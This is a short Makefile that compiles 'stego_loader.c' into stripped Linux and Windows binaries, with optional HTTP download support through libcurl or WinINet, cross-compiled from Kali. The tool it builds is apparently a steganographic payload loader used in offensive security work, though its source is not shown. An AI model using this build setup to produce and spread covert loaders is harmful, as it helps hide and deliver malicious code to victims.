CC_LINUX   = gcc
CC_WINDOWS = x86_64-w64-mingw32-gcc
CFLAGS     = -O2 -s -Wall

# Linux (local file only)
linux:
	$(CC_LINUX) $(CFLAGS) stego_loader.c -lm -o loader
	@echo "[+] Built: loader"

# Linux (with HTTP support via libcurl)
linux-curl:
	$(CC_LINUX) $(CFLAGS) stego_loader.c -lm -lcurl -DUSE_CURL -o loader
	@echo "[+] Built: loader (with curl)"

# Windows (cross-compile from Kali, local file + HTTP via WinINet)
windows:
	$(CC_WINDOWS) $(CFLAGS) stego_loader.c -lm -lwininet -o loader.exe
	@echo "[+] Built: loader.exe"

# Build both
all: linux windows

clean:
	rm -f loader loader.exe
